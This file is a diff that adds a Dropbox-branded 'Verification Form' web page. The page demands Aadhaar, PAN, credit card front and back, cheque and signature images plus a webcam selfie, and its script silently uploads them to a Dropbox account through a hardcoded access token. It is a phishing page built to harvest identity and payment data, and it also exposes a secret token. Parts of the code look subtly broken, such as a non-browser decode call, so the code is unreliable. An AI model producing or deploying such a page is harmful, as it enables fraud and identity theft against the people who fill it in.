@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Form</title>
+    <!-- Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        /* General Styles */
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .container {
+            background-color: #ffffff;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            padding: 30px;
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .dropbox-logo {
+            width: 100px;
+            margin-bottom: 20px;
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
+        }
+
+        .safe-text {
+            font-size: 14px;
+            color: #4CAF50;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        h2 {
+            color: #333;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #555;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #6a11cb;
+            font-size: 18px;
+        }
+
+        input[type="text"],
+        input[type="file"] {
+            width: 100%;
+            padding: 12px 12px 12px 45px; /* Add padding for icon */
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        input[type="text"]:hover,
+        input[type="file"]:hover {
+            border-color: #6a11cb;
+            box-shadow: 0 0 8px rgba(106, 17, 203, 0.3);
+        }
+
+        small {
+            display: block;
+            margin-top: 5px;
+            color: #777;
+            font-size: 12px;
+        }
+
+        .submit-btn {
+            background: linear-gradient(135deg, #6a11cb, #2575fc);
+            color: white;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.3s ease, transform 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(135deg, #2575fc, #6a11cb);
+            transform: translateY(-2px);
+        }
+
+        .submit-btn i {
+            font-size: 18px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+
+            h2 {
+                font-size: 20px;
+            }
+
+            input[type="text"],
+            input[type="file"] {
+                font-size: 12px;
+            }
+
+            .submit-btn {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Dropbox Logo -->
+        <img src="https://www.dropbox.com/static/images/logo_blue.png" alt="Dropbox Logo" class="dropbox-logo">
+
+        <!-- Safe Text -->
+        <div class="safe-text">Your data is safe in Dropbox</div>
+
+        <!-- Form Title -->
+        <h2>Verification Form</h2>
+
+        <!-- Verification Form -->
+        <form id="verificationForm">
+            <!-- Name Input Field -->
+            <div class="form-group">
+                <label for="name">Full Name:</label>
+                <i class="fas fa-user input-icon"></i>
+                <input type="text" id="name" name="name" placeholder="Enter your full name" required>
+            </div>
+
+            <!-- Aadhaar Card Photos (Front and Back Combined) -->
+            <div class="form-group">
+                <label for="aadhaarPhotos">Upload Aadhaar Card Photos (Front and Back):</label>
+                <i class="fas fa-id-card input-icon"></i>
+                <input type="file" id="aadhaarPhotos" name="aadhaarPhotos" accept="image/*" multiple required>
+                <small>Please upload both front and back photos of your Aadhaar Card.</small>
+            </div>
+
+            <!-- PAN Card Photo -->
+            <div class="form-group">
+                <label for="panPhoto">Upload PAN Card Photo:</label>
+                <i class="fas fa-address-card input-icon"></i>
+                <input type="file" id="panPhoto" name="panPhoto" accept="image/*" required>
+            </div>
+
+            <!-- Webcam Selfie -->
+            <div class="form-group">
+                <label for="webcamSelfie">Take a Webcam Selfie:</label>
+                <i class="fas fa-camera input-icon"></i>
+                <input type="file" id="webcamSelfie" name="webcamSelfie" accept="image/*" capture="user" required>
+            </div>
+
+            <!-- Credit Card Photos (Front and Back Combined) -->
+            <div class="form-group">
+                <label for="creditCardPhotos">Upload Credit Card Photos (Front and Back):</label>
+                <i class="fas fa-credit-card input-icon"></i>
+                <input type="file" id="creditCardPhotos" name="creditCardPhotos" accept="image/*" multiple required>
+                <small>Please upload both front and back photos of your Credit Card.</small>
+            </div>
+
+            <!-- Cheque Photo -->
+            <div class="form-group">
+                <label for="chequePhoto">Upload Cheque Photo:</label>
+                <i class="fas fa-money-check input-icon"></i>
+                <input type="file" id="chequePhoto" name="chequePhoto" accept="image/*" required>
+            </div>
+
+            <!-- Client's Signature -->
+            <div class="form-group">
+                <label for="clientSignature">Upload Client's Signature:</label>
+                <i class="fas fa-signature input-icon"></i>
+                <input type="file" id="clientSignature" name="clientSignature" accept="image/*" required>
+                <small>Please upload a clear image of your signature.</small>
+            </div>
+
+            <!-- Submit Button -->
+            <div class="form-group">
+                <button type="submit" class="submit-btn">
+                    <i class="fas fa-check-circle"></i> Submit Verification
+                </button>
+            </div>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById("verificationForm").addEventListener("submit", async (e) => {
+            e.preventDefault(); // Prevent the default form submission
+
+            try {
+                // Get form data
+                const formData = new FormData(e.target);
+                const fullName = formData.get("name");
+                const files = [];
+
+                // Process file inputs
+                const fileInputs = document.querySelectorAll("input[type='file']");
+                for (const input of fileInputs) {
+                    for (const file of input.files) {
+                        const base64 = await toBase64(file);
+                        files.push({
+                            name: file.name,
+                            mimeType: file.type,
+                            data: base64.split(",")[1], // Remove the data URL prefix
+                        });
+                    }
+                }
+
+                console.log("Submitting data:", { name: fullName, files });
+
+                // Upload files to Dropbox
+                const dropboxResponse = await uploadToDropbox(fullName, files);
+                console.log("Dropbox response:", dropboxResponse);
+
+                if (dropboxResponse.status === "success") {
+                    alert("Files uploaded successfully to Dropbox!");
+                } else {
+                    alert("Error: " + dropboxResponse.message);
+                }
+            } catch (error) {
+                console.error("Error during form submission:", error);
+                alert("An error occurred. Please check the console for details.");
+            }
+        });
+
+        // Convert file to Base64
+        function toBase64(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.readAsDataURL(file);
+                reader.onload = () => resolve(reader.result);
+                reader.onerror = (error) => reject(error);
+            });
+        }
+
+        // Upload files to Dropbox
+        async function uploadToDropbox(fullName, files) {
+            const dropboxAccessToken = "sl.u.AFlSV2g0PArqPzElJOHFdnraD4Ml3rDS-jSKepBkNG8KFu7GosAiyK9GO8Sk2ZN5RV9sO4j9-f7QS6S9yWR7qjXtUEZVRUM7-92fXeI5KHZtdNkuozyDNtc6E2nS67zRsnWdkYh-_TM_jr2NAhklfmzdc9HCo0e1HiMh2UMhjfyFu7U0uEp7WMgyQYCleIi0GH-QXdIRUsFbQc0_7blOlopPs6yeTAW-xUsPd3ST0Aefmug-HmIt8_VZ3tNN31djfDLe4TErg-gSADIlC733VgY0HOoWrlU_ZPf80UFNmH2408niX9IttIuDis6f48DaE3jZCgk_vb1wyeo409RrvLQnyDEPLQEs8a2GkIvg8tE1SY0Vi0eM5fGShHTzBS2ise2qguZBY9NOH31jAkmVhVU57vHeEOiD58_enAY5pi8KBjKuQujRwHQ5MiiNEnd_XtVEQ1V5a4SHw2MWlgDwaykRDf9KNgafkzez-W7QfiYcyYyohGMDwWsXyqxplm5WmgspLNZA_FohGxShE32crX8-khQdOkL03CtT_Cn7_-_HjLaqi4sDIGzPi1REfSucbHFXHK9aqqg24x0PH7a4DidH4t_rMA65qIYL53qNJyhBZHGWI5o4Z7NSLPurd-xd_WrxjWJysycM1IuVixT38YDEOmQQOBp7Vawxd6qDO__Sk-kE1kzeXwxq2YIzFhjgyPCqCq4WdORImpi08sm7Di-BahH7ibyhD6A4DvsboocrpHD4sd9JQvvf-OnDaOvnfHd1_wy8Q29WaSG6VizdBqRWggchjsP0TvhdoOtOMi_zNSu9BB8LbXgEDn6toqBNBYmzB5CCQzRpEDm5wKeqmXzbZAj7r_q_ZV1UslQ8CX2RCYahj7jbV84FN7o4CmzA2hiFVZvxiQbDxgW1uEQY6ydhj6GdDGQQwe9OzL47c909knyATyLM2cY0DVBaeXn4fcqw2Qgn8j_LDHArsa5zCG9jakbcAIYXmulzC4ez2WgffRrmVgbOG06hEigrNzpNmV6tEcXMB7O5nijgGT9lro5DtGyY4rGQaGGmPtdI4kGbXlfFjPfZJuJp790QKKB_zmrOlGDXwN7fEGrU4LdoURGEh1_TKFDcD60r_ZtA-_uBLxsjGsF9rc4BxdaJfN_x2UGcJo4_TdJWi9ch6DR7GTc6_rxLktkBBGs-M6D-xGSD9m0ZNDRg1eaNCmKty5fIZ3WAayUPxclqK-_zx120KnuSHDCEYibCQbMTRE7sfjwG6MfBIVCTCli1iZGxh3hcPNQ_f8hKf0ERIJgR9VKjKTixjtyA09rA9ceCSolOG9DSUrZjQlkOZdtwl7LlwRjuHDiD8BD62CnWysKiQg3K1a-SCk7EqkvN5Ks9vQHPGgxWVVZcpc52gl-qJLmEclCgO3fhTroLD6FfOEoEXdz-orf7"; // Replace with your Dropbox access token
+
+            try {
+                // Create a folder for the user
+                const folderPath = `/VerificationForm/${fullName}`;
+                await fetch("https://content.dropboxapi.com/2/files/create_folder_v2", {
+                    method: "POST",
+                    headers: {
+                        "Authorization": `Bearer ${dropboxAccessToken}`,
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        path: folderPath,
+                        autorename: false,
+                    }),
+                });
+
+                // Upload files to the folder
+                for (const file of files) {
+                    await fetch("https://content.dropboxapi.com/2/files/upload", {
+                        method: "POST",
+                        headers: {
+                            "Authorization": `Bearer ${dropboxAccessToken}`,
+                            "Content-Type": "application/octet-stream",
+                            "Dropbox-API-Arg": JSON.stringify({
+                                path: `${folderPath}/${file.name}`,
+                                mode: "add",
+                                autorename: true,
+                                mute: false,
+                            }),
+                        },
+                        body: Utilities.base64Decode(file.data),
+                    });
+                }
+
+                return { status: "success", message: "Files uploaded successfully!" };
+            } catch (error) {
+                console.error("Error uploading to Dropbox:", error);
+                return { status: "error", message: error.toString() };
+            }
+        }
+    </script>
+</body>
+</html>
